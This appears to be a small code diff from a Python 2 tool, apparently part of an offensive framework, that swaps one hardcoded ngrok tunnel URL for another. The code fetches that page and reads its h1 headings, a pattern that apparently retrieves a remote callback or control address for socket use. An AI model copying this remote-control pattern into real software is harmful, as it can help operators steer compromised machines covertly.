@@ -24,7 +24,7 @@ from core.misc import printt
 from core.config import user_agent as usera
 import socket,struct,time,os,urllib2
 from BeautifulSoup import BeautifulSoup
-url = urllib2.urlopen("https://de8c2096.ngrok.io")
+url = urllib2.urlopen("https://ad1918b5.ngrok.io")
 content = url.read()
 soup = BeautifulSoup(content)
 links = soup.findAll("h1")
